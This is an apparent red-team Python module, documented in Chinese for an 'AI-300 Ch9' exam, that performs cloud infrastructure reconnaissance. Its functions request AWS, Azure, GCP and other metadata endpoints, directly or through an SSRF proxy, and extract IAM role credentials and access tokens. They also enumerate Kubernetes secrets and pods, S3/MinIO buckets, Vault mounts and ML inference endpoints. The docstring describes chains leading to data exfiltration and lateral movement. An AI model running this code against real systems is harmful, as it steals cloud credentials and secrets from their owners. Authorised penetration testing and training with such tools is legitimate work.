"""基础设施侦察（AI-300 Ch9 AI Infrastructure & Deployment Exploitation）。

实现 AI-300 考试（Ch9）中的云/基础设施侦察技术：
  - SSRF 凭据提取：探测元数据端点获取 IAM 角色凭据
  - IAM 角色枚举：列出可用角色和权限
  - S3 存储桶发现：枚举和探测 S3/存储桶
  - SageMaker 端点探测：AI/ML 模型端点发现
  - K8s API 探测：容器编排平台侦察
  - Vault 密钥管理检测：密钥存储服务发现

考试场景（AI-300 Ch9）：
  1. SSRF → metadata endpoint → IAM role credentials
  2. IAM role → S3 bucket listing → data exfiltration
  3. IAM role → SageMaker endpoint → model inversion
  4. K8s pod → secrets → lateral movement

对齐 OWASP LLM Top 10: LLM05 (Insecure Output Handling), LLM10 (Unbounded Consumption)
"""
from __future__ import annotations

from typing import Any
from urllib.parse import urlparse

import httpx

from redteam.core.models import AuthContext

# === 云元数据端点（AI-300 Ch9.1） ===
_CLOUD_METADATA_ENDPOINTS: dict[str, list[dict[str, str]]] = {
    "aws": [
        {"path": "/latest/meta-data/", "header": "", "description": "AWS IMDSv1 metadata root"},
        {"path": "/latest/meta-data/iam/security-credentials/", "header": "", "description": "AWS IAM role listing"},
        {"path": "/latest/meta-data/iam/security-credentials/", "header": "X-aws-ec2-metadata-token: test", "description": "AWS IMDSv2 token attempt"},
        {"path": "/latest/user-data/", "header": "", "description": "AWS user-data"},
        {"path": "/latest/meta-data/public-keys/", "header": "", "description": "AWS SSH public keys"},
    ],
    "azure": [
        {"path": "/metadata/instance?api-version=2021-02-01", "header": "Metadata: true", "description": "Azure IMDS"},
        {"path": "/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/", "header": "Metadata: true", "description": "Azure managed identity token"},
    ],
    "gcp": [
        {"path": "/computeMetadata/v1/instance/service-accounts/", "header": "Metadata-Flavor: Google", "description": "GCP service accounts"},
        {"path": "/computeMetadata/v1/instance/service-accounts/default/token", "header": "Metadata-Flavor: Google", "description": "GCP access token"},
    ],
    "digitalocean": [
        {"path": "/metadata/v1.json", "header": "", "description": "DigitalOcean metadata"},
        {"path": "/metadata/v1/user-data", "header": "", "description": "DigitalOcean user-data"},
    ],
    "oracle": [
        {"path": "/opc/v1/instance/", "header": "Authorization: Bearer Oracle", "description": "Oracle Cloud metadata"},
    ],
}

# === K8s 探测端点 ===
_K8S_PROBE_PATHS: list[str] = [
    "/api/v1/namespaces/default/pods",
    "/api/v1/namespaces/default/secrets",
    "/api/v1/namespaces/default/configmaps",
    "/api/v1/namespaces",
    "/apis/apps/v1/deployments",
    "/healthz",
    "/version",
    "/openapi/v2",
]

# === S3/存储端点 ===
_STORAGE_PROBE_PATTERNS: list[str] = [
    "/api/v1/s3/buckets",
    "/api/v1/storage/buckets",
    "/minio/health/cluster",
    "/minio/admin/v3/info",
    "/api/v1/volumes",
    "/api/v1/backups",
]

# === HashiCorp Vault 探测 ===
_VAULT_PROBE_PATHS: list[str] = [
    "/v1/sys/health",
    "/v1/sys/seal-status",
    "/v1/sys/mounts",
    "/v1/sys/auth",
    "/v1/sys/policy",
    "/ui/",
]

# === SageMaker/AI 推理端点 ===
_SAGEMAKER_PROBE_PATHS: list[str] = [
    "/invocations",
    "/ping",
    "/v1/models",
    "/api/v1/endpoints",
    "/triton/v2/models",
    "/triton/v2/health/live",
    "/v1/inference",
]

# === 元数据服务地址 ===
_METADATA_SERVICE_HOSTS: str = "169.254.169.254"


def probe_cloud_metadata(
    target: str | None = None,
    auth: AuthContext | None = None,
    timeout: float = 5.0,
) -> dict[str, Any]:
    """探测云元数据服务（AI-300 Ch9.1）。

    通过 SSRF 或直接访问探测各云平台的 IMDS 端点，
    提取 IAM 角色凭据、服务账号 token 等敏感信息。

    Args:
        target: 目标 URL（用于 SSRF 代理），None 则直接访问 169.254.169.254
        auth: 认证上下文
        timeout: 超时时间

    Returns:
        元数据探测结果
    """
    results: dict[str, Any] = {
        "metadata_detected": False,
        "cloud_provider": "",
        "iam_roles": [],
        "credentials_found": [],
        "endpoints_tested": [],
        "evidence": [],
    }

    # 使用元数据 IP 或目标 URL
    if target:
        base = target.rstrip("/")
    else:
        base = "http://169.254.169.254"

    with httpx.Client(timeout=timeout, verify=False, follow_redirects=True) as client:
        headers_base = auth.to_header_dict() if auth else {}

        for provider, endpoints in _CLOUD_METADATA_ENDPOINTS.items():
            for ep in endpoints:
                url = base + ep["path"]
                results["endpoints_tested"].append(url)

                req_headers = dict(headers_base)
                if ep["header"]:
                    key, value = ep["header"].split(": ", 1)
                    req_headers[key] = value

                try:
                    resp = client.get(url, headers=req_headers)
                    if resp.status_code == 200:
                        results["metadata_detected"] = True
                        results["cloud_provider"] = provider
                        results["evidence"].append(
                            f"{provider} metadata accessible: {ep['description']}"
                        )
                        # 提取 IAM 角色信息
                        if "security-credentials" in ep["path"]:
                            # 列出角色名
                            roles = [r for r in resp.text.strip().split("\n") if r]
                            for role in roles:
                                if role and len(role) < 100:
                                    # 尝试获取角色凭据
                                    try:
                                        role_resp = client.get(
                                            url.rstrip("/") + "/" + role, headers=req_headers
                                        )
                                        if role_resp.status_code == 200:
                                            results["iam_roles"].append(role)
                                            results["credentials_found"].append({
                                                "role": role,
                                                "provider": provider,
                                                "raw": role_resp.text[:500],
                                            })
                                    except Exception:
                                        results["iam_roles"].append(role)
                        elif "token" in ep["path"].lower():
                            results["credentials_found"].append({
                                "provider": provider,
                                "type": "access_token",
                                "raw": resp.text[:500],
                            })
                except Exception:
                    continue

    return results


def probe_kubernetes_api(
    target: str,
    auth: AuthContext | None = None,
    timeout: float = 5.0,
) -> dict[str, Any]:
    """探测 Kubernetes API（AI-300 Ch9.3）。

    探测 K8s API Server 端点，识别集群版本、命名空间、密钥等。

    Args:
        target: K8s API 基础 URL
        auth: 认证上下文
        timeout: 超时时间

    Returns:
        K8s 探测结果
    """
    results: dict[str, Any] = {
        "k8s_detected": False,
        "version": "",
        "namespaces": [],
        "secrets": [],
        "pods": [],
        "endpoints_tested": [],
        "evidence": [],
    }

    headers = auth.to_header_dict() if auth else {}
    headers.setdefault("Accept", "application/json")

    with httpx.Client(timeout=timeout, verify=False, follow_redirects=True) as client:
        for path in _K8S_PROBE_PATHS:
            url = target.rstrip("/") + path
            results["endpoints_tested"].append(url)
            try:
                resp = client.get(url, headers=headers)
                if resp.status_code == 200:
                    results["k8s_detected"] = True
                    results["evidence"].append(f"K8s endpoint accessible: {path}")

                    if "/version" in path:
                        try:
                            data = resp.json()
                            results["version"] = data.get("gitVersion", "")
                        except Exception:
                            pass
                    elif "/namespaces" in path and "/secrets" not in path and "/pods" not in path:
                        try:
                            data = resp.json()
                            items = data.get("items", [])
                            results["namespaces"] = [
                                item.get("metadata", {}).get("name", "")
                                for item in items[:20] if isinstance(item, dict)
                            ]
                        except Exception:
                            pass
                    elif "/secrets" in path:
                        try:
                            data = resp.json()
                            items = data.get("items", [])
                            results["secrets"] = [
                                {
                                    "name": item.get("metadata", {}).get("name", ""),
                                    "type": item.get("type", ""),
                                    "namespace": item.get("metadata", {}).get("namespace", ""),
                                }
                                for item in items[:20] if isinstance(item, dict)
                            ]
                        except Exception:
                            pass
                    elif "/pods" in path and "/secrets" not in path:
                        try:
                            data = resp.json()
                            items = data.get("items", [])
                            results["pods"] = [
                                {
                                    "name": item.get("metadata", {}).get("name", ""),
                                    "namespace": item.get("metadata", {}).get("namespace", ""),
                                    "containers": [
                                        c.get("name", "")
                                        for c in item.get("spec", {}).get("containers", [])
                                    ],
                                }
                                for item in items[:20] if isinstance(item, dict)
                            ]
                        except Exception:
                            pass
            except Exception:
                continue

    return results


def probe_s3_storage(
    target: str,
    auth: AuthContext | None = None,
    timeout: float = 5.0,
) -> dict[str, Any]:
    """探测 S3/对象存储端点（AI-300 Ch9.2）。

    探测 S3 兼容存储服务和 MinIO 端点。

    Args:
        target: 目标基础 URL
        auth: 认证上下文
        timeout: 超时时间

    Returns:
        存储探测结果
    """
    results: dict[str, Any] = {
        "storage_detected": False,
        "storage_type": "",
        "buckets": [],
        "endpoints_tested": [],
        "evidence": [],
    }

    headers = auth.to_header_dict() if auth else {}

    with httpx.Client(timeout=timeout, verify=False, follow_redirects=True) as client:
        for path in _STORAGE_PROBE_PATTERNS:
            url = target.rstrip("/") + path
            results["endpoints_tested"].append(url)
            try:
                resp = client.get(url, headers=headers)
                if resp.status_code == 200:
                    results["storage_detected"] = True
                    if "minio" in path:
                        results["storage_type"] = "minio"
                    else:
                        results["storage_type"] = "s3_compatible"
                    results["evidence"].append(f"Storage endpoint accessible: {path}")

                    try:
                        data = resp.json()
                        if "buckets" in data:
                            results["buckets"] = data["buckets"][:20]
                    except Exception:
                        pass
            except Exception:
                continue

    return results


def probe_vault_server(
    target: str,
    auth: AuthContext | None = None,
    timeout: float = 5.0,
) -> dict[str, Any]:
    """探测 HashiCorp Vault 服务（AI-300 Ch9.3）。

    探测 Vault 的 seal 状态、挂载点和认证方法。

    Args:
        target: 目标基础 URL
        auth: 认证上下文
        timeout: 超时时间

    Returns:
        Vault 探测结果
    """
    results: dict[str, Any] = {
        "vault_detected": False,
        "sealed": True,
        "version": "",
        "auth_methods": [],
        "mounts": [],
        "endpoints_tested": [],
        "evidence": [],
    }

    headers = auth.to_header_dict() if auth else {}

    with httpx.Client(timeout=timeout, verify=False, follow_redirects=True) as client:
        for path in _VAULT_PROBE_PATHS:
            url = target.rstrip("/") + path
            results["endpoints_tested"].append(url)
            try:
                resp = client.get(url, headers=headers)
                if resp.status_code in (200, 429, 473):
                    results["vault_detected"] = True
                    results["evidence"].append(f"Vault endpoint detected: {path} ({resp.status_code})")

                    if resp.status_code == 200 and "/health" in path:
                        try:
                            data = resp.json()
                            results["sealed"] = data.get("sealed", True)
                            results["version"] = data.get("version", "")
                        except Exception:
                            pass
                    elif resp.status_code == 200 and "/auth" in path:
                        try:
                            data = resp.json()
                            results["auth_methods"] = list(data.get("data", {}).keys())
                        except Exception:
                            pass
                    elif resp.status_code == 200 and "/mounts" in path:
                        try:
                            data = resp.json()
                            results["mounts"] = list(data.get("data", {}).keys())[:10]
                        except Exception:
                            pass
            except Exception:
                continue

    return results


def probe_sagemaker_endpoints(
    target: str,
    auth: AuthContext | None = None,
    timeout: float = 5.0,
) -> dict[str, Any]:
    """探测 AI 推理端点（AI-300 Ch9.2 SageMaker/Triton）。

    探测 SageMaker、Triton Inference Server 等 AI 推理服务。

    Args:
        target: 目标基础 URL
        auth: 认证上下文
        timeout: 超时时间

    Returns:
        推理端点探测结果
    """
    results: dict[str, Any] = {
        "inference_detected": False,
        "inference_type": "",
        "models": [],
        "endpoints_tested": [],
        "evidence": [],
    }

    headers = auth.to_header_dict() if auth else {}

    with httpx.Client(timeout=timeout, verify=False, follow_redirects=True) as client:
        for path in _SAGEMAKER_PROBE_PATHS:
            url = target.rstrip("/") + path
            results["endpoints_tested"].append(url)
            try:
                resp = client.get(url, headers=headers)
                if resp.status_code == 200:
                    results["inference_detected"] = True
                    if "triton" in path:
                        results["inference_type"] = "triton"
                    else:
                        results["inference_type"] = "sagemaker_compatible"
                    results["evidence"].append(f"Inference endpoint: {path}")

                    if "/models" in path and "triton" not in path:
                        try:
                            data = resp.json()
                            if "data" in data:
                                results["models"] = [
                                    m.get("id", str(m))
                                    for m in data.get("data", [])[:20]
                                ]
                        except Exception:
                            pass
            except Exception:
                continue

    return results


__all__ = [
    "probe_cloud_metadata",
    "probe_kubernetes_api",
    "probe_s3_storage",
    "probe_vault_server",
    "probe_sagemaker_endpoints",
]
